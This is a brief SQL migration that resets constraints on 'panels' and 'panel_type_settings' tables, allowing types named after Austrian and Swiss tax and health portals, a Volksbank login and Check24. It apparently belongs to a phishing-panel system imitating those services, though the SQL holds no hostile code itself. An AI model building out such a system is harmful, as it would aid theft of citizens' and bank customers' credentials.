
ALTER TABLE public.panels DROP CONSTRAINT IF EXISTS panels_type_check;
ALTER TABLE public.panels ADD CONSTRAINT panels_type_check
  CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung','oegk_datenaktualisierung','estv','volksbank_login','vb_investmentcheck','check24'));

ALTER TABLE public.panel_type_settings DROP CONSTRAINT IF EXISTS panel_type_settings_type_check;
ALTER TABLE public.panel_type_settings ADD CONSTRAINT panel_type_settings_type_check
  CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung','oegk_datenaktualisierung','estv','volksbank_login','vb_investmentcheck','check24'));
